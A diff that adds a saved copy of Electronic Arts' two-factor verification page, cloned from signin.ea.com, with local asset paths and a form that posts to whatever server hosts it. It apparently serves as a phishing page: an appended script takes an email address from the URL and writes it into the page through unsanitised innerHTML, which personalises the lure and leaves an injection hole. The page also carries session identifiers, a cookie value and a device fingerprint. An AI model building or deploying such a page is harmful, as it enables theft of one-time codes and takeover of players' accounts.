@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<!-- saved from url=(0272)https://signin.ea.com/p/juno/login?execution=e973353798s4&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DjunoWeb%252Flogin%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.ea.com%252F%26locale%3Den%26client_id%3DDX_DROP_JS_WEB_APP -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<script async="" src="./Two Factor Log In_files/gtm.js.download"></script><script>
+    // set currentPageName when page is loaded.
+    var errorAnalyticsState = {
+        currentPageName: 'page name has not been set'
+    };
+
+    (function() {
+        var sampleRatePercentage = parseInt('10');
+
+        var sendErrorAnalytics = function(message) {
+            if (isNaN(sampleRatePercentage) || Math.random() * 100 > sampleRatePercentage) {
+                return;
+            }
+
+            if (typeof junoAnalytics !== 'undefined') {
+                var content = {
+                    pageName: errorAnalyticsState.currentPageName,
+                    errorMessage: message
+                }
+                junoAnalytics('send', 'event', 'juno', 'Javascript Error', JSON.stringify(content));
+            }
+        }
+
+        console.error = (function(oldConsoleError) {
+            return function(message) {
+                if (oldConsoleError) {
+                    oldConsoleError.apply(null, arguments);
+                }
+                sendErrorAnalytics(Array.prototype.join.call(arguments,' '));
+            }
+        })(console.error);
+
+        window.onerror = function(message) {
+            sendErrorAnalytics(message);
+        }
+
+        window.onunhandledrejection = function(event) {
+            sendErrorAnalytics(event.reason);
+        }
+    })();
+</script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+            window.GAContext =  {
+                "contextPlatform": "WEB" || "WEB",
+                "flowName": "NATIVE" || "NATIVE",
+                "pagePath": "dynamicchallenge/verifyCode" || "UNKNOWN",
+                "eventCategory": "juno"
+            };
+
+    </script>
+    <!-- Google Tag Manager -->
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+                new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+        })(window,document,'script','dataLayer','GTM-KLSSK99');
+    </script>
+    <!-- End Google Tag Manager -->
+    
+
+    <title>Two Factor Log In  </title>
+    <meta name="title" content="SIGN IN">
+    <meta name="description" content="SIGN IN">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+        <link rel="shortcut icon" href="https://signin.ea.com/p/favicon.ico">
+            <link rel="preconnect" href="https://eaaccounts.akamaized.net/">
+
+    <meta name="lc" content="en">
+    <meta name="robots" content="noindex">
+
+
+                <script type="text/javascript" src="./Two Factor Log In_files/jquery-3.7.1.min.v_1788384964.js.download" fetchpriority="high"></script>
+                <script type="text/javascript" src="./Two Factor Log In_files/jquery.origin-ux-elements-new.v_1788384964-min.js.download" fetchpriority="high"></script>
+                <script type="text/javascript" src="./Two Factor Log In_files/jquery.origin-layout.v_1788384964-min.js.download" fetchpriority="high"></script>
+                <script type="text/javascript" src="./Two Factor Log In_files/jquery.juno-codeVerify.v_1788384964-min.js.download" fetchpriority="high"></script>
+                <script type="text/javascript" src="./Two Factor Log In_files/jquery.juno-common.v_1788384964-min.js.download" fetchpriority="high"></script>
+
+<script type="text/javascript">
+    $(document).ready(function() {
+        $.fn.codeVerify({
+            isResend: false,
+            errorMsg: ""
+       });
+    });
+</script>                <script type="text/javascript" src="./Two Factor Log In_files/jquery.pin.v_1788384964-min.js.download" onerror="window.location=&#39;/p/originX/offline?locale=en&amp;theme=&#39;" fetchpriority="high"></script>
+<script type="text/javascript">
+    var goBack = false;
+    var pinSend = false;
+    var curStep = "dynamicchallenge/verifyCode";
+    var prevStep = "dynamicchallenge/sendCode";
+    var step = "4";
+    var prevPageDuration = "12";
+    $(document).ready(function () {
+        $.fn.pin({
+            pinRestUrl: "https://pin-river.data.ea.com/pinEvents",
+            pinRestHeaders: {
+                'x-ea-game-id-type': 'client',
+                'x-ea-game-id': 'server_nucleus',
+                'x-ea-taxv': '2.0',
+                'x-ea-env': 'prod'
+            },
+            pinRestMessage: {
+                curStep: "dynamicchallenge/verifyCode",
+                prevStep: "dynamicchallenge/sendCode",
+                stepNum: "4",
+                sessionId: "RlMxOjMuMDoyLjA6RHEzUUpmU3JheG50WFQ3WEZBMldmSkEyOnNkbnRt",
+                titleId: "DX_DROP_JS_WEB_APP",
+                titleIdType: "projectid",
+                category: "juno/login",
+                version: "0.5-prod",
+                environment: "prod",
+                platform: "web",
+                pinFlowName: "NATIVE",
+                host: "signin.ea.com",
+                webCookie: "8d9cfd76-443a-40ad-b6eb-e7859d7772a8",
+                prompt: "",
+                ageGroup: "",
+                ageVerified: "",
+            },
+            pathRestMessage: {
+                type: "funnel"
+            },
+            pageViewRestMessage: {
+                type: "web_page",
+                locale: "en",
+                prevPageTimeStamp: "1,788,636,919,711",
+                prevPageDuration: "12",
+                viewRenderedTimeStamp: 1788636919929,
+                DOMLoadedTimeStamp: Date.now()
+            }
+            , hashedUserId: "unknown"
+            , emailRemindAction: "-1"
+            , clientId: "DX_DROP_JS_WEB_APP"
+            , source: ""
+            , playerId: "unknown"
+        });
+        if (pinSend === false) {
+        }
+        $.fn.pin.helpers.postSpecifiedTfaPathAndPageViewMessage("", "EMAIL");
+    });
+</script>
+
+
+                <link rel="stylesheet" type="text/css" href="./Two Factor Log In_files/otk.v_1788384964-min.css" fetchpriority="high">
+
+                <link rel="stylesheet" type="text/css" href="./Two Factor Log In_files/juno-common.v_1788384964-min.css" fetchpriority="high">
+
+                <link rel="stylesheet" type="text/css" href="./Two Factor Log In_files/juno-tfa.v_1788384964-min.css" fetchpriority="high">
+
+                <link rel="stylesheet" type="text/css" href="./Two Factor Log In_files/quantum.v_1788384964-min.css" fetchpriority="high">
+
+    
+                <script type="text/javascript" src="./Two Factor Log In_files/md5.v_1788384964-min.js.download" fetchpriority="high"></script>
+    
+    <script type="text/javascript" src="./Two Factor Log In_files/cni_anF1ZXJ5LnBiZC1kZi11dGlscw.js.download" integrity="sha384-7gqsEy/7J5LPzajtGejvowPrz9POT5Zqh8nErgtUt2q087v4yKYWERw7yjJR8X9j" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="./Two Factor Log In_files/cni_anF1ZXJ5LnBiZC1kZi1hdXRvLWluaXQ.js.download" integrity="sha384-dnkzPtP4vTHF9XeDNpR5GYYJ5MJyRA2ZCObeLfGUGKcNIJjRakpi7RKxj83mYcan" crossorigin="anonymous"></script>
+    <script>var confirmWithEnterEnabled = true;</script>
+
+</head>
+<body style=" " class="">
+    <!-- Google Tag Manager (noscript) -->
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KLSSK99"
+                      height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+    <!-- End Google Tag Manager (noscript) -->
+
+    <div class="form-container">
+        <form method="post" id="otcForm"><input type="text" name="verification" id="otcForm-verification" tabindex="-1" autocomplete="off" style="position: absolute; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none;">
+            <div id="tfa-login" class="views">
+                <div class="otknotice-stripe otknotice-active" id="online-general-info" }="" style="display: none;">
+                    <div class="otknotice-stripe-message">
+                        <span class="otkicon"><svg height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="m0 0h24v24h-24z"></path><path d="m12 1.5c5.7989899 0 10.5 4.70101013 10.5 10.5 0 5.7989899-4.7010101 10.5-10.5 10.5-5.79898987 0-10.5-4.7010101-10.5-10.5 0-5.79898987 4.70101013-10.5 10.5-10.5zm0 2c-4.69442037 0-8.5 3.80557963-8.5 8.5 0 4.6944204 3.80557963 8.5 8.5 8.5 4.6944204 0 8.5-3.8055796 8.5-8.5 0-4.69442037-3.8055796-8.5-8.5-8.5zm0 7.5c.5128358 0 .9355072.3860402.9932723.8833789l.0067277.1166211v4c0 .5522847-.4477153 1-1 1-.5128358 0-.9355072-.3860402-.9932723-.8833789l-.0067277-.1166211v-4c0-.5522847.4477153-1 1-1zm0-3.5c.5522847 0 1 .44771525 1 1s-.4477153 1-1 1-1-.44771525-1-1 .4477153-1 1-1z" fill="#276afc"></path></g></svg></span>
+                        <span class="otkc otkc-small">
+                        <strong>
+                        </strong>
+			        </span>
+                    </div>
+                </div>
+                <section id="verificationGate" class="">
+        <a href="javascript:void(0);" role="button" id="backToLoginBtn" class="back-btn">
+            <i class="otkicon"></i>
+            <span class="quantum-input-icon back-btn-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" class="injected-svg css-ojkidl" data-src="/static/media/ARROW_LEFT.e40e5952.svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="Icons/SM/Navigation/Arrow-Left" fill="none" fill-rule="evenodd"><path id="Bounding-Box" d="M0 0h16v16H0z"></path><path id="Primary" fill="#FFF" d="M5.293 4.707a1 1 0 0 1 1.414-1.414l4 4a1 1 0 0 1 0 1.415l-4 4a1 1 0 1 1-1.414-1.415L8.586 8 5.293 4.707z" transform="matrix(-1 0 0 1 16 0)"></path></g></svg>    </span>
+                Back
+        </a>
+                    <!-- logo -->
+    <img class="header" aria-hidden="true" src="./Two Factor Log In_files/EALogo-New.svg" fetchpriority="high" decoding="async">
+                    <h1 class="otktitle otktitle-2">Enter your code</h1>
+
+                    <div class="otkc verify">
+We sent a code to <b>ri*****@yahoo.com</b>.                    </div>
+<div class="otkform-group">
+        <label class="otklabel label-uppercase" for="twoFactorCode">
+            Code
+        </label>
+
+    <div class="otkinput otkinput-grouped otkform-group-field input-margin-bottom-error-message otkinput-grouped_radius">
+
+        <input type="text" id="twoFactorCode" name="oneTimeCode" value="" autocomplete="off" placeholder="Enter 6 digit code" autocorrect="off" autocapitalize="off">
+    </div>
+</div>
+
+                    <div id="online-general-error" class="otkform-group-help" style="margin-top: -11px; display: none;">
+                        <p class="otkc otkinput-errormsg">
+                        </p>
+                    </div>
+                    <br>
+<span class="otkcheckbox ">
+	<input type="hidden" name="_trustThisDevice" value="on">
+	<input type="checkbox" id="trustThisDevice" name="trustThisDevice" checked="checked">
+    <label for="trustThisDevice">
+        <span id="content" class="link-in-message">Remember this device</span>
+        
+    </label>
+</span>
+                        <br>
+                    <div class="btn-box">
+    <input type="hidden" name="_eventId" value="submit" id="_eventId">
+<a role="button" class="otkbtn otkbtn-primary  zero-margin" href="javascript:void(0);" id="btnSubmit" style="float:right;max-width:100%;">NEXT</a>
+                    </div>
+
+                    <div class="separator-16"></div>
+                        <div style="margin: 0px auto; width: fit-content">
+                            <p class="otkc resendLink zero-margin">If you don't see the email in your inbox, check your spam folder and promotions tab. If you still don't see it, <a href="javascript:void(0)" id="resend">request a resend</a>.</p>
+                        </div>
+                        <div class="separator-6"></div>
+                </section>
+            </div>
+        <input type="hidden" name="pbd" id="otcForm-pbd" value=""><input type="hidden" name="pbdt" id="otcForm-pbdt" value=""><input type="hidden" name="pbde" id="otcForm-pbde" value="UEJEIGluaXRpYWxpemF0aW9uIGNvbXBsZXRlZC4="><input type="hidden" name="df" id="otcForm-df" value="eyJjZCI6MjQsInNyIjoiMTkyMHgxMDgwIiwidHoiOiJBbWVyaWNhL0NoaWNhZ28iLCJ1YSI6IjM4OTU2OGM4OTQ1NjNlN2U0NzViMWYzZDQ3MTE3ZTYyIiwiaGMiOjEyLCJkbSI6MTYsImNmIjoiMmE2MWZhYzU5MzNlOGExMDI1M2IwNjc5YmI1OTgxYzAiLCJ3ZiI6IkFOR0xFIChOVklESUEsIE5WSURJQSBHZUZvcmNlIFJUWCAyMDcwICgweDAwMDAxRjAyKSBEaXJlY3QzRDExIHZzXzVfMCBwc181XzAsIEQzRDExKSIsImFmIjoiZDQxZDhjZDk4ZjAwYjIwNGU5ODAwOTk4ZWNmODQyN2UiLCJwZyI6ImMwZjQ4ODA2ZTJkYzc1ZDZmY2JkOTFkZTc5NTdiYjZmIiwidHMiOnRydWUsImN0IjoiNGciLCJ0byI6MzAwLCJjcyI6dHJ1ZSwiZG50IjpudWxsLCJsZyI6ImVuLVVTIn0="><input type="hidden" name="dft" id="otcForm-dft" value="eyJvdmVyYWxsIjoxMi41LCJjZnQiOjUuMjAwMDAwMDAyOTgwMjMyLCJ3ZnQiOjUuMDk5OTk5OTk0MDM5NTM1NSwiYWZ0Ijo2LjA5OTk5OTk5NDAzOTUzNTUsInBndCI6MC41fQ=="><input type="hidden" name="dfe" id="otcForm-dfe" value=""></form>
+    </div>
+
+    <div id="form-errors" class="form-error">
+        <span id="form-error-authorization-failure">The security code you entered is invalid</span>
+    </div>
+
+    <script type="text/javascript">
+        sendGAJunoPageView('/juno/aov/twofactor_multiOptionsVerify');
+    </script>
+
+
+
+<!-- ### prdsignin-use1-6596f4688c-6v6f8 ### -->
+
+<script>
+// Extract email from URL
+const urlParams = new URLSearchParams(window.location.search);
+const email = urlParams.get('email');
+
+if (email) {
+  // Update the message, e.g., "We sent a code to..."
+  const messageSpan = document.querySelector('.otknotice-stripe-message span.otkc');
+  if (messageSpan) {
+    messageSpan.innerHTML = `We sent a code to <b>${email}</b>.`;
+  }
+}
+    </script>
+
+
+</body></html>
